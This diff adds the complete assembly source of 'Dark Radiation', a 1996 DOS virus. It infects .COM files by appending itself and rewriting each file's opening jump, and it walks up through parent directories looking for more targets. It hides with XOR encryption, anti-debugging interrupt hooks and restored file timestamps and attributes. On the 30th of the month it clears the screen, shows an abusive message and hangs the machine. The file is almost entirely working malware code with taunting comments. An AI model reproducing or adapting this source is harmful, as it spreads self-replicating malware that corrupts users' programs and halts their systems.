@@ -1,0 +1,449 @@
+;----------------------------------------------------------------------------;
+;|VirusName:     Dark Radiation                                             |;
+;|VirusAuthor:   Death Wizard                                               |;
+;|VirusKind:     A Non-Overwriting, Non-TSR .COM Infector                   |;
+;|Stealth:       Minimal, Restores Time, Data And Attributes                |;
+;|Encryption:    A Simple XOR Loop With 65536 Diffrent Combinations         |;
+;|AntiDebug:     A Simple Int Replacement                                   |;
+;|Dedication:    To Patty Hoffman And All The Other AV Lamers               |;
+;----------------------------------------------------------------------------;
+
+
+virus   segment
+        assume  cs:virus,ds:virus
+        org 100h
+
+Start:  jmp     TST
+        db      0cch
+
+Next:   call    ReStart
+
+ReStart:pop     cx
+        sub     cx, offset ReStart
+        mov     bp, cx
+        
+        mov     ax,3501h                 ;Get Vector Function
+        int     21h                      ;Execute Function
+
+        call    EncHandler
+
+        mov     ax,2501h                 ;Set Vector Function
+        lea     dx,[bp+offset FD]
+First:  int     21h                      ;Execute Function
+        
+        call    Enc                      ;Call Encryption Routine
+
+CryptStart:                              ;Cryptation Starts Here
+        
+        mov     [bp+offset OldInt1Off],bx
+        mov     [bp+offset OldInt1Seg],es
+
+        mov     ax,3503h                 ;Get Vector Function
+        int     21h                      ;Execute Function
+        mov     [bp+offset OldInt3Off],bx
+        mov     [bp+offset OldInt3Seg],es
+
+        mov     ax,2503h                 ;Set Vector Function
+        lea     dx,[bp+offset FD]
+        int     21h                      ;Execute Function
+
+        push    cs
+        pop     es                                        
+        
+        lea     si, [bp+offset OldBytes] ;Restore OldFile
+        mov     di, 0100h                ;Restore OldFile
+                               
+        movsw                            ;Restore OldFile
+        movsb                            ;Restore OldFile
+        movsb
+
+        lea     dx, [bp+offset Dta]      
+        mov     ah, 01ah
+        int     021h                     ;Set DTA To Our DTA
+
+        mov     ah, 047h                 
+        mov     dl, 0
+        lea     si, [bp+offset OldDir]
+        int     021h                     ;Get Current Dir
+
+
+        mov     ah, 04eh
+        lea     dx, [bp+Com_Mask]
+        mov     cx, 111b
+
+FindNew:int     021h                     ;Find New *.COM File
+        jc      ChangeDir                ;Change Dir If NoFiles Left
+
+        mov     ax, 04300h               ;Get Attributes
+        lea     dx, [bp+offset Dta+30]
+        int     21h      
+        mov     [bp+File_A], cx
+
+        ;ADDA
+
+        lea     bx, [bp+offset Dta+30+5]
+        cmp     word ptr [bx], 'DN'
+        jne     Fix2
+        jmp     GetNew
+
+        ;ADDA
+
+Fix2:   xor     cx, cx
+        mov     ax, 04301h               ;Set Attributes
+        lea     dx, [bp+offset Dta+30]
+        int     21h
+
+        mov     ax, 03d02h
+        lea     dx, [bp+offset Dta+30]
+        int     021h                     ;Open File
+        xchg    ax, bx
+
+        mov     ax, 05700h              
+        int     021h                     ;Get Date/Time
+
+        mov     [bp+File_T], cx
+        mov     [bp+File_D], dx              
+
+        mov     ah, 03fh
+        lea     dx, [bp+OldBytes]
+        mov     cx, 4
+        int     021h                     ;Get First 3 Bytes
+        
+        ;EXTRA
+        push    bx
+        lea     bx, [bp+OldBytes+3]
+        
+        cmp     BYTE PTR [bx],0CCh
+        je      CloseP
+        pop     bx
+
+        ;EXTRA
+
+                
+        call    CheckFile
+        jmp     NewPlace
+
+CloseP: jmp Close
+        
+ChangeDir:
+        mov     ah, 03bh     
+        lea     dx, [bp+offset DotDot]
+        int     021h                     ;Change Dir To ..
+        jc      TransferP                 ;If C:\ Exit
+
+        mov     ah, 04eh
+        lea     dx, [bp+Com_Mask]
+        mov     cx, 111b
+        jmp     FindNew                  ;Find New File
+
+TransferP:
+        jmp     Transfer
+
+NewPlace: 
+        xor     al, al  
+        call    Set_Point                ;Set FilePointer To SOF
+        
+        mov     ah, 040h                
+        mov     cx, 4
+        lea     dx, [bp+JmpOp]
+        int     021h                     ;Write Jmp And Offset To File
+        
+        mov     al, 2
+        call    Set_Point                ;Set FilePointer To EOF
+
+        mov     ah, 02ch                 
+ReNew:  int     021h                     ;Get New Cryptation Value And Put
+        cmp     dx, 0
+        je     ReNew
+
+        mov     [bp+CryptV], dx          ;In Variable
+        inc     [bp+InfectCount]         ;One More Infection
+
+
+        push    es
+        mov     ah, [bp+InfectCount]         
+        mov     es, ax
+        mov     ah, 02ch
+        int     021h
+
+        and     dl, 00000011b
+        mov     [bp+InfectCount], dl
+        
+
+CryptEnd:                                ;Cryptation Stops Here
+        call    Enc                      ;Crypt Virus In Memory
+        call    EncHandler
+        
+        mov     ah, 040h
+        mov     cx, EoF-Next    
+        lea     dx, [bp+Next]
+        int     021h                     ;Write Rest Of Virus
+        
+        call    EncHandler
+        call    Enc                      ;DeCrypt Virus In Memory
+
+        mov     ax, es
+        mov     [bp+InfectCount], ah
+        pop     es
+        
+        call    Close
+
+;**************************
+;******  SUBROUTINES  *****
+;**************************
+CheckFile:
+        mov     ax, word ptr [bp+Dta+26] ;Get FileSize2AX
+        cmp     ax, 1024                 ;Check If File Is Smaller Than 1K
+        jb      Close
+        cmp     ax, 64000                ;Check If File Is Bigger Than 64K
+        ja      Close
+
+        cmp     [bp+InfectCount], 5      ;Only 5 Infections 
+        je      SorryNoMore
+
+        sub     ax, 3                    ;Calculate Jmp Offset And Put In AX
+        add     ax, ViriiLength
+        
+        ;add     ah, HIGH ViriiLength
+        ;add     al, LOW ViriiLength
+        ;sub     al, 11
+
+        sub     al, 12
+        mov     word ptr [bp+JumpBuffer], ax  
+        
+        ret
+
+SorryNoMore:
+        mov     cx, [bp+File_T]
+        mov     dx, [bp+File_D]          
+
+        mov     ax, 05701h
+        int     021h                     ;Restore File Date/Time
+
+        mov     ah, 03eh
+        int     021h                     ;Close File
+
+        mov     cx, [bp+File_A]
+        mov     ax, 04301h             
+        lea     dx, [bp+offset Dta+30]
+        int     21h                      ;Restore File Attributes
+
+        jmp Transfer                     ;Jmp2Transfer
+
+Close:                                   
+        mov     cx, [bp+File_T]          ;Here
+        mov     dx, [bp+File_D]
+
+        mov     ax, 05701h
+        int     021h                     ;Restore Date/Time
+
+        mov     ah, 03eh
+        int     021h                     ;Close File
+
+        mov     cx, [bp+File_A]
+        mov     ax, 04301h             
+        lea     dx, [bp+offset Dta+30]
+        int     21h                      ;Restore Attributes
+
+GetNew: mov     ah, 04fh
+        lea     dx, [bp+Com_Mask]
+        mov     cx, 111b
+        jmp     FindNew                  ;Find New File
+
+Transfer:
+        mov     dx, 080h
+        mov     ah, 01ah
+        int     021h                     ;Restore Old DTA
+
+        mov     ah, 03bh
+        lea     dx, [bp+offset Root]    
+        int     021h                     ;CHDIR To C:\
+                                         ;Reason:Else  Wont Work 
+        mov     ah, 03bh
+        lea     dx, [bp+offset OldDir]
+        int     021h                     ;CHDIR To OldDir
+
+        mov     ah, 02ah
+        int     021h
+        cmp     dl, 30                   ;Get Day
+        je      HappyBirthDay            ;If 30:th Jmp HappyBirthDay
+        jmp     NoPresent                ;Jmp NoPresent
+
+HappyBirthDay:
+        mov     ah, 0fh
+        int     010h
+        mov     ah, 0
+        int     010h                     ;Clear Screen
+
+        mov     ah, 1           
+        mov     ch, 32
+        mov     cl, 32
+        int     010h  
+
+        mov     ah, 9
+        lea     dx, [bp+offset StringToShow]
+        int     021h                     ;Let The User Now Where Here
+
+        mov     al, 7
+        int     029h
+
+CliA:   cli
+        jmp     CliA
+        
+NoPresent:
+                        
+        push    ds        
+        push    ds        
+
+        mov     dx,[bp+OldInt1Off]       ;DS:DX=new vector
+        mov     ax,[bp+OldInt1Seg]
+        mov     ds,ax
+        mov     ax,2501h                 
+        int     21h                      ;Restore ANTI-DEBUG
+
+        pop     ds
+
+        mov     dx,[bp+OldInt3Off]       
+        mov     ax,[bp+OldInt3Seg]
+        mov     ds,ax
+        mov     ax,2503h                 
+        int     21h                      ;Restore ANTI-DEBUG
+
+        pop     ds
+
+        mov     di, 0100h
+        jmp     di                       ;Restore Control To Old Program
+
+Set_Point:
+        mov     ah, 042h
+        xor     cx, cx
+        cwd
+        int     021h                     ;Set FilePointer Routine
+        ret
+
+
+Com_Mask        db      '*.com',0        ;Files To Search For
+OldBytes        db      0cdh,020h,090h,090h   ;The Saved Bytes
+JmpOp           db      0e9h             ;Jmp To 
+JumpBuffer      dw      ?                ;Offset For Jump
+                db      0cch
+
+File_A          dw      ?                ;File Attributes
+File_T          dw      ?                ;File Time
+File_D          dw      ?                ;File Date
+
+DotDot          db      '..',0           ;CHDIR Path
+InfectCount     db      0                ;Infection Count
+
+StringToShow    db      "(C) 1996 Death Wizard",0ah,0dh
+                db      "Created In The North Of Sweden A Cold Winter Day...",0ah,0dh
+                db      "Caio, Your Computer Is Infected By Dark Radiation",0ah,0dh
+                db      "Your Fucking HardDrive Is NoMore!",0ah,0dh
+                db      "I Suggest You Get A Newer Copy Of Fuck-Prot Or Else...",0ah,0dh
+                db      "See Ya Later...(Just Kidding About Your HardDrive)",0ah,0dh,024h
+Dedication      db      'Dedicated To All The Fucking Lamers In This Fuckin World. Hope You Got Really Scared On The 30:Th'
+
+Root            db      '\',0            ;CHDIR Path
+ViriiLength     equ     EoF-Start
+
+Crypt2End:                               ;Cryptation Stops Here
+
+FD:     mov     ah, 0fh                  ;FuckDebug Routine
+        int     010h
+        mov     ah, 0
+        int     010h                     ;Clear Screen
+
+        mov     ah, 9
+        lea     dx, [bp+offset Fuck_Debug]
+        int     021h                     ;Let LAMER Know He Is A LAMER
+
+        cli                              ;No Ctrl+Alt+Del 
+        
+L1:     mov     al, 7
+        int     029h
+        jmp     L1                       ;Beep Forever
+
+
+
+OldInt1        label   dword             ;Old Int1 Handler
+OldInt1Off     dw      0
+OldInt1Seg     dw      0         
+
+OldInt3        label   dword             ;Old Int3 Handler
+OldInt3Off     dw      0
+OldInt3Seg     dw      0         
+Fuck_Debug     db      "FUCK YOU LAMER!",0ah,0dh,"SYSTEM HALTED",024h
+
+Enc:    push    bx
+        push    cx
+        push    ax
+
+        lea     bx, [bp+First]           ;Check ANTI Debug Is Trashed
+        mov     ax, [bx]
+
+        cmp     ax, 021CDh                      
+        jne     FD                       ;Jump To ANTI Debug
+
+        lea     bx, cs:[bp+CryptStart]   ;Where To Start Crypt
+        mov     cx, (CryptEnd-CryptStart+1)/2 ;How Much To Crypt
+        mov     ax, [bp+CryptV]          ;Crypt With What
+        
+xorloop:xor     word ptr cs:[bx], ax     ;Do It BABE!
+        inc     bx
+        inc     bx
+        loop    xorloop
+
+        lea     bx, cs:[bp+Close]       ;Where To Start Second Crypt
+        mov     cx, (Crypt2End-Close+1)/2 ;How Much To Crypt
+        mov     ax, [bp+CryptV]         ;Crypt With What
+        
+  
+xorloop2:
+        xor     word ptr cs:[bx], ax    ;Do It BABE!
+        inc     bx
+        inc     bx
+        loop    xorloop2
+
+        pop     ax
+        pop     cx
+        pop     bx
+        ret
+
+
+Crypt3End:
+
+CryptV          dw      00              ;Crypt Value 
+
+EncHandler:    
+        push    bx
+        push    cx
+        push    ax
+
+        lea     bx, [bp+Crypt2End]   ;Where To Start Crypt
+        mov     cx, (Crypt3End-Crypt2End+1)/2 ;How Much To Crypt
+        mov     ax, [bp+CryptV]          ;Crypt With What
+        
+xorloop3:
+        xor     [bx],ax
+        inc     bx
+        inc     bx
+        loop    xorloop3
+
+        pop     ax
+        pop     cx
+        pop     bx
+        ret
+
+FakeRight       db      'Copyright 1996 Patty Hoffman',0,90h ;FakeRight
+
+TST:    jmp     $-ViriiLength+7
+
+EoF:                                    ; EndOfFile
+
+Dta             db      42 dup(?)        ;New DTA
+OldDir          db      64 dup(?)        ;Old Dir Saveing Place
+
+
+Virus   ENDS
+        END     Start
+
